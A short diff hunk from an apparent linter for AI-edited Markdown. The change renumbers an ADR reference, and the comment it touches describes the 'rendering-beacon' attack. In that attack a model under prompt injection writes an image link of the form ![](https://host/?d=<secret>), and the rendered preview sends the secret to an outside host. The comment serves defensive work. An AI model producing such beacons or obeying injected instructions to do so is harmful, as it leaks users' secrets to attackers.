@@ -1,5 +1,5 @@
 /**
- * The pre-write linter for AI-touched Markdown (ADR 0018, §6).
+ * The pre-write linter for AI-touched Markdown (ADR 0019, §6).
  *
  * The rendering-beacon class: a model under prompt injection writes
  * `![](https://host/?d=<secret>)` into a proposal, the preview renders it, the
